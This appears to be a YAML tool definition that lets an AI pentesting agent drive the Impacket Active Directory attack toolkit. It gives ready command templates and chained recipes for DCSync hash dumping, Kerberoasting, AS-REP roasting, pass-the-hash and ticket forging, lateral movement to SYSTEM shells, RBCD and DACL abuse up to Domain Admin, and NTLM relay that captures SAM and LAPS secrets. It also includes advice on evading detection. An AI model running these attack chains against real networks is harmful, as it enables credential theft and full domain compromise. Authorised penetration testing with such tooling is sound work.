name: impacket
kind: cli
# binary: omitted intentionally — multi-sub-binary toolkit. Each usage_pattern
# below declares its own `binary:` field, and tool_runner passes that through
# to cli_in_container as an explicit binary arg (overriding the absent
# top-level binary). 47 sub-binaries on PATH inside the image.
image: "ghcr.io/silicon-works/mcp-tools-impacket:latest"
image_size_mb: 300
# Dual-clock model — impacket sub-binaries do single Kerberos/SMB/RPC ops.
# Each op should be quick; long silences mean stuck.
idle_timeout_seconds: 120       # 2 min — most impacket ops emit progress steadily
max_runtime_seconds: 1800       # 30 min — even slow domain enum should finish here
timeout_seconds: 1800
version: "0.12.x"
description: "Active Directory and SMB attack toolkit (47 Python sub-binaries: secretsdump, psexec, wmiexec, smbexec, GetUserSPNs, GetNPUsers, getTGT, getST, smbclient, lookupsid, mssqlclient, addcomputer, findDelegation, rbcd, changepasswd, dacledit, owneredit, ticketer, ...). Covers DCSync, lateral movement (psexec/wmiexec/smbexec/dcomexec/atexec), Kerberos (kerberoast, AS-REP roast, ticket forging, S4U2Self/Proxy, golden/silver tickets), SMB/RPC enumeration (smbclient, samrdump, lookupsid, rpcdump), MSSQL (mssqlclient, mssqlinstance), AD ACL/attribute editing (dacledit, owneredit, addcomputer, addspn, rbcd), and credential dumping (LAPS, GPP passwords, DPAPI backup keys). Each sub-binary has its own CLI surface; the LLM constructs the full invocation."
capabilities:
  - active_directory_attack
  - credential_dump
  - kerberos_attack
  - smb_operations
  - lateral_movement
  - post_exploitation
  - mssql_operations
  - rpc_enumeration

phases:
  - enumeration
  - exploitation
  - post_exploitation

routing:
  use_for:
    - "DCSync — dump all domain user NT hashes from a Domain Controller"
    - "Kerberoast — request TGS tickets for SPN-bound accounts and crack offline"
    - "AS-REP roast — extract AS-REP for accounts with DONT_REQUIRE_PREAUTH"
    - "lateral movement via SMB-based exec (psexec/smbexec) for admin shells"
    - "lateral movement via WMI/DCOM exec (wmiexec/dcomexec) — stealthier than psexec"
    - "lateral movement via task scheduler (atexec) — file-less but slow"
    - "obtain or convert Kerberos tickets (getTGT, getST, ticket_converter)"
    - "S4U2Self/Proxy constrained delegation abuse (getST -impersonate)"
    - "enumerate SMB shares and download/upload files (smbclient)"
    - "RID brute force enumeration of domain users (lookupsid)"
    - "MSSQL operations: query, xp_cmdshell, dump (mssqlclient)"
    - "find delegation paths (findDelegation: unconstrained, constrained, RBCD)"
    - "create AD computer accounts (addcomputer) — used for RBCD attacks"
    - "edit DACL/owner of AD objects (dacledit, owneredit) — abuse WriteDACL/WriteOwner"
    - "configure resource-based constrained delegation (rbcd)"
    - "forge golden / silver / sapphire Kerberos tickets (ticketer)"
    - "extract LAPS or GPP cleartext passwords from AD (get_laps_password, get_gpp_password)"
    - "DPAPI domain backup key retrieval (dpapi_backupkeys)"
  never_use_for:
    - "interactive SMB sessions across many commands — use shell-session"
    - "Kerberos username enumeration — use kerbrute (much faster, no creds needed)"
    - "password spraying — use kerbrute or netexec"
    - "SMB share content brute-forcing — use smbmap or netexec --shares --spider"
    - "in-memory credential dumping on a host you already shell — use lsassy / nanodump"
  triggers:
    - "impacket"
    - "secretsdump"
    - "psexec"
    - "wmiexec"
    - "smbexec"
    - "dcomexec"
    - "atexec"
    - "kerberoast"
    - "GetUserSPNs"
    - "asreproast"
    - "GetNPUsers"
    - "getTGT"
    - "getST"
    - "DCSync"
    - "S4U2Self"
    - "S4U2Proxy"
    - "ticketer"
    - "golden ticket"
    - "silver ticket"
    - "rbcd"
    - "addcomputer"
    - "dacledit"
    - "lookupsid"
    - "RID brute"
    - "smbclient"
    - "mssqlclient"

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 256
  cpu: 0.5

see_also:
  - tool: kerbrute
    reason: "Use kerbrute for username enumeration and password spraying (faster, no creds); use impacket for the actual attack chain"
  - tool: netexec
    reason: "netexec for credential validation across many hosts and protocols; impacket for the per-host operation"
  - tool: john
    reason: "Crack Kerberoast TGS hashes (--krb5tgs format) and AS-REP hashes (--krb5asrep format)"
  - tool: hashcat
    reason: "GPU cracker; faster on TGS/asrep hashes for large wordlists"
  - tool: bloodhound
    reason: "Find attack paths after enumerating users/groups; impacket executes the chosen path"
  - tool: certipy
    reason: "ADCS-specific attacks (ESC1-ESC15); impacket handles general AD/SMB"
  - tool: ssh
    reason: "After psexec/wmiexec yields SSH credentials, use `ssh` (kind:cli v2.0) ControlMaster pattern to maintain a persistent session — socket at /session/output/sshctl/, separate tool-runner spawns reuse via ControlPath. For non-SSH foothold shells (raw bash from psexec output redirect), use `nc` (kind:cli v2.0) held-listener pipeline pattern. The legacy `shell-session` (kind:mcp) tool was retired May 2026 — its 9 methods now live in ssh + nc."

# ── kind:cli specific sections ──────────────────────────────────────

target_extraction:
  # impacket positional target form is `[domain/]user[:password]@host` — most
  # binaries (secretsdump, psexec, wmiexec, smbclient, mssqlclient, etc.) use
  # this. Domain and password are optional. Host is the connection target.
  #
  # The regex carefully:
  #   - Optionally consumes `domain/`  (^(?:[^/@\s]+/)?)
  #   - Consumes `user[:password]`     ([^@\s]+)
  #   - Captures host after @          @([^:/?#\s]+)   <- group 1
  - rule: "positional_match"
    pattern: '^(?:[^/@\s]+/)?[^@\s]+@([^:/?#\s]+)'
    group: 1
    parse_as: "raw"

  # Some binaries take an explicit -target / -target-ip flag. Used by
  # ntlmrelayx (-t), getST (-spn target), and as override for SPN resolution.
  - rule: "flag_value"
    flag: "-target"
    parse_as: "raw"
  - rule: "flag_value"
    flag: "-target-ip"
    parse_as: "raw"

  # Fallback: GetUserSPNs / GetNPUsers / changepasswd accept ONLY
  # `[domain/]user[:password]` (no @host) — the DC is the operational target,
  # specified via -dc-ip. This rule fires last so it never overrides a real
  # positional/-target. Listed here so getuserspns/getnpusers/changepasswd
  # commands don't return target=null and bypass scope validation.
  - rule: "flag_value"
    flag: "-dc-ip"
    parse_as: "raw"

# Flags whose presence makes target scope un-validatable. Empty for impacket —
# unlike sqlmap's -r/-l/-m/-g, impacket binaries don't have multi-target
# file-loading patterns. ntlmrelayx is special (multi-target -t / -tf) but is
# excluded from this pilot (it's stateful — Tier B candidate).
reject_flags: []

# Flag values that must NOT be confused with positional targets. The DSL
# merges these with its built-in defaults. Critical entry: -dc-ip is auth
# infrastructure, NOT the attack target — only used by target_extraction's
# fallback rule above when no positional/-target is present.
value_flags:
  # Auth / Kerberos
  - "-dc-ip"          # KDC for Kerberos lookup, only the attack target when no positional present
  - "-dc-host"
  - "-hashes"         # NTLM hash 'LM:NT' or ':NT'
  - "-aesKey"         # Kerberos AES key (128/256-bit hex)
  - "-no-pass"        # boolean flag; no value, but listed for safety
  - "-k"              # boolean flag; use Kerberos auth
  - "-rpc-auth-level" # rpc auth level
  - "-codec"          # output codec
  - "-domain-sid"
  # Output / behavior
  - "-output-file"
  - "-outputfile"     # GetUserSPNs / GetNPUsers spelling variant
  - "-format"
  - "-history"
  - "-just-dc"
  - "-just-dc-ntlm"
  - "-just-dc-user"
  - "-pwd-last-set"
  - "-resumefile"
  - "-system"
  - "-bootkey"
  - "-share"
  - "-port"
  - "-debug"
  - "-ts"
  - "-encoder"
  - "-server"
  - "-request"        # boolean for kerberoast
  - "-usersfile"      # file of usernames (for GetNPUsers / lookupsid)
  - "-no-preauth"
  - "-impersonate"    # S4U2Self impersonation user — value is a USERNAME, not target
  - "-spn"            # SPN value (e.g., cifs/dc01) — not the connection target
  - "-self"
  - "-altservice"
  - "-additional-ticket"
  - "-renew"
  - "-validate"
  - "-no-encryption"
  - "-q"              # mssqlclient SQL query
  - "-file"
  - "-wmi-namespace"
  # ntlmrelayx (multi-target listener — but listed here in case agent uses)
  - "-t"
  - "-tf"
  - "-w"
  - "-wh"
  - "-wa"
  - "-l"
  - "-lh"

# Env vars accepted by cli_in_container's `env` arg for this tool.
# Container knobs FAKETIME / FAKETIME_DONT_FAKE_MONOTONIC are always allowed
# (the plugin hoists them to libfaketime). Anything else must be listed here.
# Kerberos workflows (impacket-getTGT, then -k -no-pass against secretsdump /
# psexec / wmiexec / GetUserSPNs / etc.) require KRB5CCNAME pointing at the
# ccache; KRB5_CONFIG lets the agent supply an explicit krb5.conf.
allowed_env:
  - KRB5CCNAME      # Kerberos ccache path (-k -no-pass workflows)
  - KRB5_CONFIG     # path to krb5.conf (realm / KDC config)

usage_patterns:
  # ── DCSync / credential dump ─────────────────────────────────────
  - name: "DCSync — dump all domain user NT hashes (NTLM only)"
    binary: "impacket-secretsdump"
    command: "{domain}/{user}:{password}@{dc_host} -just-dc-ntlm -outputfile /session/output/loot/secretsdump"
    when: "Post-exploitation: extract every domain user's NT hash from the DC via DCSync (DRSUAPI). Requires DA or 'Replicating Directory Changes' permission. Outputs hashes.txt + ntds.json under /session/output/loot/."

  - name: "DCSync via Kerberos ticket (no password)"
    binary: "impacket-secretsdump"
    command: "{domain}/{user}@{dc_host} -k -no-pass -just-dc-ntlm -outputfile /session/output/loot/secretsdump"
    when: "Same as DCSync but using existing Kerberos ccache (KRB5CCNAME env). Ideal after getTGT or pass-the-ticket."

  - name: "Local secrets dump (SAM + LSA from a member host)"
    binary: "impacket-secretsdump"
    command: "{domain}/{user}:{password}@{target} -outputfile /session/output/loot/{target}-local"
    when: "Dump local SAM, LSA secrets, cached domain creds from a member server/workstation. Requires local admin. Different from DCSync (which targets the DC)."

  # ── Lateral movement ─────────────────────────────────────────────
  - name: "Lateral movement — psexec (SMB-based service exec)"
    binary: "impacket-psexec"
    command: "{domain}/{user}:{password}@{target}"
    when: "Get an interactive SYSTEM shell on a Windows target via SMB-based service execution. Requires admin creds. Most reliable, but creates an obvious service event."

  - name: "Lateral movement — psexec via Kerberos"
    binary: "impacket-psexec"
    command: "{domain}/{user}@{target} -k -no-pass"
    when: "Same as psexec but using existing Kerberos ticket. Works against modern hardened targets that disable NTLM."

  - name: "Lateral movement — wmiexec (DCOM-based, no service)"
    binary: "impacket-wmiexec"
    command: "{domain}/{user}:{password}@{target}"
    when: "Get a semi-interactive shell via WMI (no service created). Stealthier than psexec but commands are less interactive (each command is a separate WMI call)."

  - name: "Lateral movement — smbexec (SMB pipes)"
    binary: "impacket-smbexec"
    command: "{domain}/{user}:{password}@{target}"
    when: "Alternative to psexec when the latter fails. Native SMB pipes; less reliable but quieter than psexec on some targets."

  - name: "Lateral movement — dcomexec (DCOM ShellWindows / ShellBrowserWindow / MMC20)"
    binary: "impacket-dcomexec"
    command: "{domain}/{user}:{password}@{target}"
    when: "Lateral movement via DCOM objects. Stealthiest of the four exec methods but most fragile (target needs DCOM enabled and not blocked by firewall)."

  - name: "Lateral movement — atexec (Task Scheduler)"
    binary: "impacket-atexec"
    command: "{domain}/{user}:{password}@{target} '{command}'"
    when: "Execute a single command via the Windows Task Scheduler. File-less but slow (10-30s per command). Useful when SMB/RPC service execution is blocked."

  # ── Kerberos attacks ─────────────────────────────────────────────
  - name: "Kerberoast — request TGS for all SPN accounts"
    binary: "impacket-GetUserSPNs"
    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/output/loot/kerberoast.txt"
    when: "Enumerate accounts with SPNs and request their TGS tickets (for offline cracking). Any domain user can run this. Outputs $krb5tgs$ hashes. NOTE: the binary is impacket-GetUserSPNs (camelCase) — common typo: impacket-getuserspns does NOT exist."

  - name: "AS-REP roast — extract hashes for DONT_REQUIRE_PREAUTH accounts"
    binary: "impacket-GetNPUsers"
    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/output/loot/asreproast.txt"
    when: "Find accounts with Kerberos preauth disabled and extract their AS-REP for offline cracking. Authenticated form. NOTE: binary is impacket-GetNPUsers (camelCase)."

  - name: "AS-REP roast — unauthenticated (with username list)"
    binary: "impacket-GetNPUsers"
    command: "{domain}/ -dc-ip {dc_ip} -no-pass -usersfile {users_file} -outputfile /session/output/loot/asreproast.txt"
    when: "AS-REP roast WITHOUT credentials. Pass a newline-separated username file (often from kerbrute userenum). The trailing slash after domain is required."

  - name: "Get a Kerberos TGT (for pass-the-ticket / pass-the-key)"
    binary: "impacket-getTGT"
    command: "{domain}/{user}:{password} -dc-ip {dc_ip}"
    when: "Request a TGT and save it to a ccache file (current dir = /session). Set KRB5CCNAME=/session/<user>.ccache to use it for subsequent -k -no-pass calls. Foundational step for Kerberos-based attacks."

  - name: "Get a TGT with NT hash (overpass-the-hash)"
    binary: "impacket-getTGT"
    command: "{domain}/{user} -hashes :{nt_hash} -dc-ip {dc_ip}"
    when: "Convert an NTLM hash into a Kerberos TGT (overpass-the-hash). Useful when you have a hash from secretsdump but the target requires Kerberos auth."

  - name: "S4U2Self/Proxy — impersonate a user via constrained delegation"
    binary: "impacket-getST"
    command: "{domain}/{user}:{password} -spn {target_spn} -impersonate {victim_user} -dc-ip {dc_ip}"
    when: "Abuse constrained delegation: get a service ticket for {target_spn} as {victim_user}. Requires the controlled account to have constrained delegation rights. Output is a ccache file in CWD (= /session)."

  # ── Enumeration ──────────────────────────────────────────────────
  - name: "RID brute force — enumerate domain users"
    binary: "impacket-lookupsid"
    command: "{domain}/{user}:{password}@{dc_host}"
    when: "Enumerate domain users via SID lookup (RID brute). Lists every user/group/computer SID. Often works even when LDAP is restricted. Default RID range 0-4000 is fine for most domains."

  - name: "SMB share enumeration + interactive client"
    binary: "impacket-smbclient"
    command: "{domain}/{user}:{password}@{target}"
    when: "Interactive SMB client (like smbclient(1) but Python). Use this to enumerate shares and download/upload files. Often used after secretsdump to navigate a target. Note: opens an interactive prompt — for one-shot commands prefer netexec smb."

  - name: "MSSQL — query and command execution"
    binary: "impacket-mssqlclient"
    command: "{domain}/{user}:{password}@{target} -windows-auth"
    when: "Connect to a Microsoft SQL Server. Use -windows-auth for AD authentication, omit for local SQL auth. Once connected: enable_xp_cmdshell, xp_cmdshell 'whoami', SELECT @@version, etc."

  - name: "Find delegation paths in the domain"
    binary: "impacket-findDelegation"
    command: "{domain}/{user}:{password} -dc-ip {dc_ip}"
    when: "Enumerate accounts with delegation rights (unconstrained, constrained, resource-based). Critical for finding privesc paths to DA. NOTE: binary is impacket-findDelegation (camelCase)."

  # ── AD object editing ───────────────────────────────────────────
  - name: "Create a machine account in the domain"
    binary: "impacket-addcomputer"
    command: "{domain}/{user}:{password} -computer-name '{machine_name}$' -computer-pass '{machine_password}' -dc-host {dc_host}"
    when: "Create a new machine account (any domain user can create up to MachineAccountQuota=10 by default). Used for RBCD attacks and as a pivot principal."

  - name: "Configure Resource-Based Constrained Delegation"
    binary: "impacket-rbcd"
    command: "-action write -delegate-to '{victim_computer}$' -delegate-from '{controlled_computer}$' {domain}/{user}:{password}"
    when: "Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on {victim_computer}, pointing to {controlled_computer}. Used in conjunction with addcomputer + getST -impersonate to escalate to admin on victim."

  - name: "Edit DACL on an AD object"
    binary: "impacket-dacledit"
    command: "-action write -rights FullControl -principal '{controlled_user}' -target '{target_object}' {domain}/{user}:{password}"
    when: "Grant {controlled_user} FullControl over {target_object}. Used after finding WriteDACL on a privileged group or user (e.g., from BloodHound). Common path: WriteDACL on Domain Admins → grant self DA."

output_formats:
  # Most impacket binaries are prose-output. The few exceptions:
  #   - GetUserSPNs / GetNPUsers: -outputfile writes hashes (`$krb5tgs$` /
  #     `$krb5asrep$`) one per line (NOT JSON, but parseable).
  #   - secretsdump: -outputfile writes hashes.txt + ntds.json (JSON for
  #     ntds!), plus prints to stdout.
  - flag: "-outputfile {path}"
    format: "hashes_file"
    preferred: true
  - flag: "-output-file {path}"
    format: "hashes_file"
    preferred: false
  - flag: "-debug"
    format: "verbose_prose"
    preferred: false
  - flag: "-ts"
    format: "timestamps"
    preferred: false

common_options:
  authentication:
    - "[domain/]user[:password]@host: positional target form (most binaries)"
    - "-hashes [LM]:NT: pass-the-hash (LM is usually empty: -hashes :NThash)"
    - "-aesKey HEX: Kerberos AES128 (32 hex) or AES256 (64 hex) key"
    - "-k: use Kerberos auth (reads ccache from KRB5CCNAME env)"
    - "-no-pass: don't prompt for password (use with -k or -hashes)"
    - "-dc-ip IP: KDC IP (Kerberos resolution); auth path, NOT the attack target"
    - "-dc-host FQDN: explicit DC FQDN (alternative to -dc-ip)"
  output:
    - "-outputfile FILE: write hashes / results to file (camelCase varies by binary)"
    - "-debug: verbose output to stderr"
    - "-ts: prefix log lines with timestamps"
  secretsdump:
    - "-just-dc-ntlm: DCSync, NT hashes only (fastest)"
    - "-just-dc: DCSync, all (NT + LM + Kerberos keys)"
    - "-just-dc-user 'DOMAIN/user': DCSync just one user"
    - "-system FILE -security FILE -sam FILE: offline dump from registry hives"
    - "-history: include password history"
    - "-pwd-last-set: include lastSet timestamp"
  exec_methods_psexec:
    - "-codec CODEC: output codec (default cp437; try utf-8 for Unicode)"
    - "-service-name NAME: rename the service (default a random 4-char string)"
    - "-remote-binary-name NAME: rename the dropped binary"
  kerberos:
    - "getTGT writes ccache to CWD as <user>.ccache; set KRB5CCNAME=/session/<user>.ccache"
    - "getST -impersonate USER -spn SVC: S4U2Self+Proxy chain"
    - "getST -altservice SVC: change service portion of resulting ticket (e.g., 'cifs' → 'ldap')"
    - "ticketer: forge golden (-spn omitted, needs krbtgt hash + domain SID) or silver (-spn set, needs service hash)"
  smbclient:
    - "Interactive prompt: use 'help' to see commands. Common: shares, use SHARE, ls, cd, get FILE, put FILE, mkdir, rmdir."
    - "Non-interactive: use netexec smb --shares for a one-shot listing"

gotchas:
  - "Binary names are CASE-SENSITIVE. impacket-GetUserSPNs / impacket-GetNPUsers / impacket-getTGT / impacket-getST / impacket-findDelegation are camelCase. impacket-secretsdump / impacket-psexec / impacket-smbclient are lowercase. Use --help against the binary if unsure."
  - "-dc-ip is the KDC, NOT the attack target. The plugin's target_extraction extracts -dc-ip ONLY when no positional or -target is present (kerberoast/asreproast case). Always pin the actual attack host as either positional @host or -target."
  - "Kerberos auth requires KRB5CCNAME env pointing at a ccache. After getTGT writes /session/<user>.ccache, every subsequent -k -no-pass call needs KRB5CCNAME=/session/<user>.ccache. Pass it via cli_in_container's `env` arg: `env: '{\"KRB5CCNAME\":\"/session/<user>.ccache\"}'` (declared in this tool's allowed_env)."
  - "Clock skew: Kerberos auth fails (KRB_AP_ERR_SKEW) when the host clock differs from the DC by >5min. Pass FAKETIME via cli_in_container's `env` arg to shift the container clock — e.g. `env: '{\"FAKETIME\":\"+10m\"}'` if the DC is 10min ahead. FAKETIME is a container knob (always allowed) and the plugin hoists it through libfaketime via LD_PRELOAD on container start."
  - "GetUserSPNs / GetNPUsers do NOT take @host — only [domain/]user[:password]. The DC is auto-discovered from the domain, OR explicitly via -dc-ip. -dc-ip becomes the operational target via the fallback target_extraction rule."
  - "The trailing slash on the domain matters for unauthenticated calls: 'CORP/' + -no-pass works for asreproast against a username list; 'CORP' (no slash) is NOT a valid principal."
  - "AS-REP / Kerberoast hash files use john / hashcat formats (--krb5asrep / --krb5tgs). Don't pass the raw hash to john without the format flag — it'll guess wrong."
  - "psexec creates a service event (4697) and an SMB write to ADMIN$. Stealth-conscious engagements should prefer wmiexec or dcomexec."
  - "smbclient is INTERACTIVE — opens a prompt. Single-shot file ops are easier via netexec smb --get-file / --put-file."
  - "addcomputer's MachineAccountQuota: any authenticated user can add up to 10 machine accounts by default. The -computer-name MUST end in $ (it's a machine SAM name)."
  - "rbcd writes msDS-AllowedToActOnBehalfOfOtherIdentity. To exploit: addcomputer (controlled), rbcd write delegate-to=victim delegate-from=controlled, getST -impersonate=Administrator -spn=cifs/victim, then psexec @victim -k -no-pass."
  - "secretsdump output format: stdout shows hashes inline; the -outputfile flag writes hashes.txt (one user:rid:lmhash:nthash::: per line) and ntds.json (structured). Parse the .txt for cracking, the .json for structured queries."
  - "ticketer for golden tickets: -domain-sid required (get from lookupsid or Get-DomainSID), -nthash krbtgt_hash required, omit -spn for golden (-spn set = silver). User name is positional. ccache lands in CWD."
  - "DACL/ACL editing (dacledit/owneredit/rbcd) writes to AD; check msDS-AllowedToActOnBehalfOfOtherIdentity / nTSecurityDescriptor changes via -action read first to verify."
  - "impacket-getPac does NOT accept -dc-ip (legacy mcp-server.py filtered it out). Pass the DC as the connection target via positional @dc instead. Other binaries do accept -dc-ip."
  - "impacket-smbclient / impacket-smbexec are INTERACTIVE — they read commands from stdin until 'exit'. Under run_cli, pass commands via stdin_data as 'shares\\nexit\\n' (smbclient) or '<cmd>\\nexit\\n' (smbexec). Without 'exit', the binary waits forever and the heartbeat keeps the session alive past sane timeouts."
  - "smbclient file ops need stdin choreography: 'use SHARE\\ncd \\\\dir\\nget file\\nexit\\n'. Paths use Windows backslashes (replace '/' with '\\\\'). The downloaded file lands in the binary's CWD."
  - "Some sub-binaries take a SUBCOMMAND positional: 'impacket-dpapi backupkeys -t <host>' (dpapi uses -t, not @host); 'impacket-exchanger <user:pass@host> nspi' (subcommand AFTER identity). For services/reg/net/tstool/wmipersist, the action keyword (list/start/stop/query/install/...) is positional AFTER the identity string."
  - "PsExec output 'is not writable' on every share = no admin rights. Classify as permission failure even if exit==0; switch to wmiexec or smbexec or escalate. Other Kerberos error codes worth catching: KDC_ERR_CLIENT_REVOKED (account locked/disabled), KDC_ERR_KEY_EXPIRED (password expired - use changepasswd), KDC_ERR_ETYPE_NOSUPP (DC etype mismatch). SMB additions: STATUS_PASSWORD_MUST_CHANGE, STATUS_SHARING_VIOLATION (file locked, retry), STATUS_BAD_NETWORK_NAME (share not found)."
  - "krb5.conf: legacy mcp-server.py auto-generated /etc/krb5.conf with [libdefaults]/[realms]/[domain_realm] on first Kerberos call. The kind:cli image relies on whatever is baked into the image, OR a krb5.conf the LLM writes via the bash tool to /session/output/config/krb5.conf and copies into /etc/. If KDC_ERR_*/'realm not local' errors appear with valid creds and DC connectivity, missing krb5.conf is the usual cause."
  - "ccache auto-promotion (RETIRED in kind:cli): legacy mcp-server.py parsed 'Saving ticket in <path>.ccache' from getTGT/getST stdout and copied to /session/output/credentials/<safe_principal>.ccache. Under run_cli the binary writes to its CWD; the agent must -outputfile-equivalent or move the file explicitly to /session/output/. Set CWD via 'cd /session && impacket-getTGT ...' or rely on container default CWD if it is /session."
  - "impacket-rbcd / impacket-changepasswd / impacket-addspn (krbrelayx): legacy implementations called scripts under /opt/impacket-scripts/ and /opt/krbrelayx/ rather than impacket-* CLIs. The kind:cli image SHOULD have impacket-rbcd / impacket-changepasswd / impacket-addspn on PATH; if 'command not found' appears, fall back to 'python3 /opt/impacket-scripts/<name>.py' or 'python3 /opt/krbrelayx/addspn.py'. addspn flag style is non-standard: -u DOMAIN\\\\user -p pass -t target -s spn [-r] <dc_host>."
  - "Feature 28 dynamic recipes (RECIPE_DIR=/session/recipes/impacket — note: NOT /session/tool_recipes/impacket like other tools) are RETIRED for the kind:cli path; the LLM writes argv directly. Recipes still load if directory exists for legacy method calls but are a dead branch under run_cli (REQ-TR-016)."
  - "DAEMON BINARY OUTLIER — impacket-ntlmrelayx is the one binary in this 47-binary toolkit that's daemon-shaped (listens for inbound NTLM auth, doesn't naturally exit). HARD CONVENTIONS when invoking it: (0) STDIN MUST BE KEPT OPEN — ntlmrelayx has an interactive command loop that polls stdin and exits cleanly when stdin is closed. cli_in_container closes stdin by default, so a direct `binary: impacket-ntlmrelayx` invocation EXITS RIGHT AFTER 'Servers started, waiting for connections' and the agent gets no relay. WRAP via bash: `binary: bash, command: -c 'exec impacket-ntlmrelayx <args> < /dev/zero'`. The `< /dev/zero` keeps stdin readable forever so the event loop blocks instead of exiting. (1) use `--no-multirelay` for fire-and-forget single-shot — exits cleanly after the first successful relay; (2) ALWAYS pass `-l /session/output/relay-loot -of /session/output/relay-hashes` so captured creds/certs/SAM dumps land on shared volume and survive SIGKILL on max_runtime; (3) for time-bounded multi-relay, prefix with `timeout NN` OR rely on cli_in_container's max_runtime_seconds (the docker-kill SIGKILL preserves the loot files since they're already on disk via -of/-l)."
  - "ntlmrelayx mid-flight peek — while a relay is running (one tool-runner spawn blocked on the listener), a SEPARATE tool-runner spawn can read the partial captures by Read'ing `/session/output/relay-loot/` directory or `/session/output/relay-hashes_*.txt`. Container mutex serializes calls within ONE container only; reading via the bash tool / Read primitive uses different containers and is unblocked. Note: ntlmrelayx writes to disk only when relay attempts complete or hit milestones — pre-relay listener-state stdout (e.g. '[*] HTTP server started') is NOT visible until the call exits unless you wrap with `script -q /session/output/relay-stdout.log` or accept the file-only outcome view."
  - "ntlmrelayx success/failure extraction (replaces impacket-relay.status structured fields). After a relay run completes, parse stdout + lootdir to determine outcome. STDOUT MARKERS (verified against impacket 0.13.x source 2026-05-09): \n    [*] Servers started, waiting for connections           — listener bound\n    [*] SMBD-Thread-N: Connection from 1.2.3.4 controlled  — inbound auth received\n    [*] Authenticating against ldap://dc.example as DOMAIN\\user SUCCEED   — relay_success\n    [-] Authenticating against ldap://dc.example as DOMAIN\\user FAILED   — relay attempted, target rejected\n    [*] Certificate successfully written to file           — adcs_success\n    [*] Domain info dumped into lootdir!                   — RBCD prep done\n    [*] Privilege escalation succesful, shutting down...   — escalate_user worked\n    [*] Done dumping SAM hashes for host: HOSTNAME         — relayed creds dumped SAM\n    [*] SOCKS: Adding scheme://user@host... to active SOCKS — socks=true relay caught\n    [*] Successfully dumped N LAPS passwords through relayed account — laps_success\n  LOOTDIR FILES on success: <stem>_<host>_<user>_samhashes.txt (SAM dump), <stem>_<host>_<user>_secrets.txt (LSA), domain_<dc>_users.json (RBCD enum), <user>.pfx + <user>.ccache (ADCS), msDS-AllowedToActOnBehalfOfOtherIdentity_<target>.dump (RBCD write).\n  GOTCHAS: (1) The lootdir is NOT created until the first successful relay; absence of /session/output/relay-loot/ does NOT mean failure if no auth ever arrived. (2) ntlmrelayx writes its progress to STDERR, not stdout — capture both: redirect with `>/session/output/relay-stdout.log 2>&1`. AVOID `script -q` for log capture — it records stdin too, and `< /dev/zero` (the stdin keep-alive trick) injects null-byte garbage into the log. Direct redirection is cleaner and verified working.\n  AGENT EXTRACTION RECIPE (full pattern): \n    binary: bash, command: -c 'mkdir -p /session/output/relay-loot && impacket-ntlmrelayx <args> -l /session/output/relay-loot -of /session/output/relay-hashes >/session/output/relay-stdout.log 2>&1 < /dev/zero'\n  Then from a separate tool-runner spawn:\n    binary: bash, command: -c 'ls -la /session/output/relay-loot/ 2>/dev/null; echo \"---markers---\"; grep -E \"SUCCEED|FAILED|successfully|Done dumping|Adding.*active SOCKS|Servers started\" /session/output/relay-stdout.log 2>/dev/null'"

failure_signatures:
  # All signals are impacket's own stderr or socket-error pass-throughs.
  # Live-verified against the kind:cli image on 2026-04-25 (verification log
  # in failure_signature_tests.md).
  - signal: "STATUS_LOGON_FAILURE"
    remediation: "Wrong password or wrong username/domain. Verify creds and the [domain/] prefix. NTLM hash format: -hashes :NT (LM is usually empty)."
  - signal: "STATUS_NOT_SUPPORTED"
    remediation: "NTLM is disabled on the target. Switch to Kerberos auth: 1) impacket-getTGT to obtain a TGT, 2) export KRB5CCNAME=/session/<user>.ccache, 3) re-run with -k -no-pass. The SMB layer rejects auth before any password check, so credential errors are masked by this code on hardened targets."
  - signal: "STATUS_ACCESS_DENIED"
    remediation: "Auth succeeded but the user lacks permission for the operation (e.g., DCSync needs DA / DCSync rights; psexec needs local admin). Try a different user or escalate first."
  - signal: "STATUS_ACCOUNT_DISABLED"
    remediation: "The target account is disabled. Find an enabled account or re-enable via dacledit/net."
  - signal: "STATUS_ACCOUNT_LOCKED_OUT"
    remediation: "Stop spraying. Wait for the lockout to expire or use a different user."
  - signal: "STATUS_PASSWORD_EXPIRED"
    remediation: "Cred is valid but expired. Use changepasswd to set a new one before further auth."
  - signal: "KRB_AP_ERR_SKEW"
    remediation: "Clock skew >5min between attacker and DC. Estimate the offset from nmap smb-os-discovery 'System time' and pass FAKETIME via cli_in_container's env arg to shift the container clock — e.g. `env: '{\"FAKETIME\":\"+10m\"}'` if the DC is 10min ahead. FAKETIME is a container knob, hoisted to LD_PRELOAD libfaketime by the plugin."
  - signal: "KDC_ERR_C_PRINCIPAL_UNKNOWN"
    remediation: "User principal not found in the realm. Verify [domain/]user format and that the domain is the correct realm name."
  - signal: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
    remediation: "Service principal not found. For Kerberos to a host, the SPN (cifs/host or host/host) must be registered. Try -target-ip with the IP and ensure -dc-ip is set."
  - signal: "KDC_ERR_PREAUTH_REQUIRED"
    remediation: "AS-REP roast attempted on an account that DOES require preauth — this is the normal case. Filter your username list down to actual DONT_REQUIRE_PREAUTH accounts (use kerbrute or netexec to verify)."
  - signal: "KDC_ERR_PREAUTH_FAILED"
    remediation: "Wrong password during Kerberos preauth (the Kerberos equivalent of STATUS_LOGON_FAILURE)."
  - signal: "DCERPC Runtime Error: code: 0x5"
    remediation: "RPC access denied — same root cause as STATUS_ACCESS_DENIED but from the DCERPC stack. User lacks the privilege for this RPC interface."
  - signal: "DCERPC Runtime Error"
    remediation: "Generic RPC error — check the specific code: 0x5 = access denied, 0x16c9a087 = endpoint not registered. Some endpoints require -rpc-auth-level packetPrivacy."
  - signal: "rpc_s_access_denied"
    remediation: "RPC permission denied (lower-level form). Often means the user can authenticate but not call this specific RPC method."
  - signal: "ERROR_DS_DRA_BAD_DN"
    remediation: "DCSync replication request rejected. User lacks 'Replicating Directory Changes' / 'Replicating Directory Changes All' rights on the domain object."
  - signal: "Connection refused"
    remediation: "TCP connect failed. Verify the port is open with nmap (445 SMB, 135 RPC, 88 Kerberos, 1433 MSSQL, 389 LDAP). Check VPN routing."
  - signal: "[Errno 113] No route to host"
    remediation: "Network unreachable from the container. Check VPN (tun0) is up and the target is reachable from the host."
  - signal: "[Errno 111] Connection refused"
    remediation: "Same as 'Connection refused' — port is closed or filtered."
  - signal: "[Errno -2] Name or service not known"
